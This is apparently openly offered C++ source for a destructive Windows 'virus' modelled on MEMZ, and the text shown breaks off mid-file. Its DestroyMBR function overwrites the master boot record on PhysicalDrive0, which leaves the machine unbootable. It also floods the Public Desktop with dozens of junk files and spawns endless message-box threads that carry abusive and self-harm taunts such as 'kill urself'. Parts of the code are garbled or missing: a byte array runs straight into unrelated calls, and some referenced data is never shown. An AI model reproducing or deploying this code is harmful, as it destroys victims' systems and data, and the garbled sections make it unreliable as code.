/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
    CreateFileA("\\Users\\Public\\Desktop\\þ³¤þ³¤þ³¤ü®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßððððþþð®®éð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ß®ééþé®þ®þ®ðð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áßææááßååéé", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³ßß®é©ñüþúþúþ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åéå®é®ßßé³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\íøóßéüóúßßüáá", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éé€®®ü¼€€¼ú€ú", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éåé®þé€ü€ü€", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ó®íñåááðßáðß®", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ß®é®éþ®ééðßßß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ðåþ€éü®€ú®¼®þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å®³éþé®€¤éé®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¡äáéþé®þ¤¼€4®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\²ääåå¼½üüíþ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r²²³²³®þþ®®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r35¼½é®þþ®®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r¤³²²¡666¤²®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\rgeéþé®þþ®®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¼þ®®¼¼6¼¼66®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r³€€¼¤½¤½®®®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\2¤éåþüééé®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r4³€²¤¼³¼½ü¾’’®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µñ©ááåé®²åßé¼í¾ó", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åíöéþíßßúßßðéáááßßðá", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\íðåáúäðúñó³‘¼«å¥²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öáñí©ååååü®ßðßw²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\þéóßðöÐÉÅÐðáá", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öáñí¤³åäðåäéåé¤²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öé³¤üþüüþþé®ðß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öáñí²éå®íóüþ®éé²²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áåüö¬¬»«’úü¼¤þ³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áä³¤¬«öóúü¼‘¥×«®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¬»¥¥’ö«’¾¼¤³ðé¡³®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öåéðó©å®€®ééåééåßð²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ö®íáþóßó®þñéðéó®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éñðé®µáñåíøøñóþ®éá©þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åéåþüúþ½ðßðß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßðé®ééóéóó©þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öáñíåéå©óáåðí²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öíáµßðéåéåéåí²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\á³€¼¾€53³²²³®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ö¤³²€€ü€¤¤þ³¤þþ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ö3²€¤®ðéå³2²³³®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\á€€¼ü€ü€üú¼½¾¬»«öö«»²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®é©úéñþé²®³¤þ³€¼éáåðä", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®úß³þ¼ú½¼í¤ðåq3r€ü¤€ü€¼", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÞÉ®ÉÍßÑÓÉß©ÁÖÉ®ÍÞÑÓÅ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\NOESCAPE³®³¤Þ¤Þ³Þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®úßßíáñ¤®³Þ€³Ü¤€¤ÜÜå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®úß²³®²®Þ³¤Þ³¤Þ³óå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®úßßíáñðé®²®²ÐÅßßßåóå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®É³Þ€Þ¤€¼€€€®ÉÉÁÁÅÅÉÅÉå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\chÚÖÁØÁ’ÉÑÐÉ®µÁÑå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\É²Å®ÉÓÅÖÚÞÓÉØÄÚÉØÓÉÉÉ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÖÚÞÓÉØÄÚÉØÉÉxðxðxðdx", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åååé®®³þ€ü¤¼ü½€ú€½íú€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Íáþéß©óøøø¡¡¡¡²²³¡¤²¤¤²€", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éñðé®µáñíáþééñðé®µáñ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Éñðé®µáñFú©kÚüóúüóúüóú", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\aáåå®®þ¤þü€ü¤ú¼ú¼€ú€€34", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤²þ³þü¤ü77½€¤³666¼€¤", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áßíðéåí®éé®®þðßóíáøðáéå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\a®é®þþ®óé®äåíóåíðäóíåéóå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åðåééó®é®éåéåéåé®¤€€¤½¼½€½", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\äßåðé®é®éþge®åéåååfweåteþé®þéü®þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\A©©Éßß_Íß_ÐÉÑÍÉÐÐÐÐÐÐ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\TßÍßÍßßÍßÍÐÐÅÓÉ®ÍÉ®ÉÍ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÚÐ©Ð©®É®®¤Þ€Ü¼€½€WÉ®ÉREGEG", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åü½¤²²²þ¤€½€¾¾¼¾½½¾", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åü½¤²²²þ¤€½€¾¾¼¾½½¾", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÐÉØÉÞÉ¥ÞÍßµÉßßßÅÅÉÞ³¤Þ³¤€ÍÞ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Å®¤³¤¤€Ü’¤Ü’®’³®’²³®’²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Á®ÉÁ51ØÓØØØØØØØØØØØØØ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÅÓÁÞÉßµÉßßßØßÐÉÓ€Ü¾¥¬×¬«", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\€¼¤½¬¾¼¬€¬€³¬¤²¬»×«", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÓµFG¥ÅÁÐÉÍÉ®ÉÍÉ®ÉÉ®É®ÍÉ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\AÐ®ÅÉÞÞ¤€³Ü¤Ü¤€Y4", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åÁÅÉ¼¼Í¾Í½½¾¼Ú€€", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÜÞßßÁÁÁÐÉ³€Ö¬¬¬¾Ö¾‘", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åúüþéåóðé®þüíó½½€³²²³³³¤¤", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßþóßöéóöåóþ¤é", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\vkþóñáñééåéééä", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
}


/* destroy MBR by overwrite it */
void DestroyMBR() {  

    DWORD dwBytesWritten;

    HANDLE MasterBootRecord = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

    WriteFile(MasterBootRecord, mbrContent, 512, &dwBytesWritten, NULL);

    CloseHandle(MasterBootRecord);

    cout << "\nMBR Has been destroyed\n";
}

/* first message box thread */
DWORD WINAPI messageBoxThread(LPVOID parameter) {
    while (1) {
        MessageBoxW(NULL, L"ur crazy, u ran unwanted virus", L"kill urself", MB_OK | MB_ICONWARNING);
        Sleep(3000);
        MessageBoxW(NULL, L"u need to die", L"ahahahahaah", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        MessageBoxW(NULL, L"(╯°□°)╯︵ ┻━┻ ", L"i will kill everyone",  MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"C:\\ folder is empty", L"lol", MB_OK | MB_ICONERROR);
        Sleep(2000);
        MessageBoxW(NULL, L"Interactive sign-in process initialization has failed.\n\nPlease check the event log for details.", L"Sign-in process initialization failure", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"next generation of enderman?\n huh? ur crazy", L"colorful", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"don't press ok", L"ur crazy!!!!", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"><(((*>", L"система", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
    }
    return 0;
}

/* 2nd message box thread */
DWORD WINAPI messageBox1Thread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L"did you run it? why?", L"The Narrator", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"Stop clicking Ok", L"The Narrator", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"uR crazy bro u cannot run the unwanted virus", L"0_o", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"nel", L"yes", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"null is Null or Inexistent", L"True or false?", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"The application was unable to start correctly (0xc000029A) Click OK to close the application", L"unwanted.exe - Application Error", MB_OK | MB_ICONERROR);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
    }
}

/* 3rd message box thread */
DWORD WINAPI messageBox2Thread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L"anananananana", L"aaemnanandn", MB_OK | MB_ICONINFORMATION);
        Sleep(3000);
        MessageBoxW(NULL, L"lookk colorful bkgrn", L"ahahahahaah", MB_OK | MB_ICONERROR);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        Sleep(1500);
        MessageBoxW(NULL, L"die die die", L"i will kill everyone", MB_OK | MB_ICONERROR);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
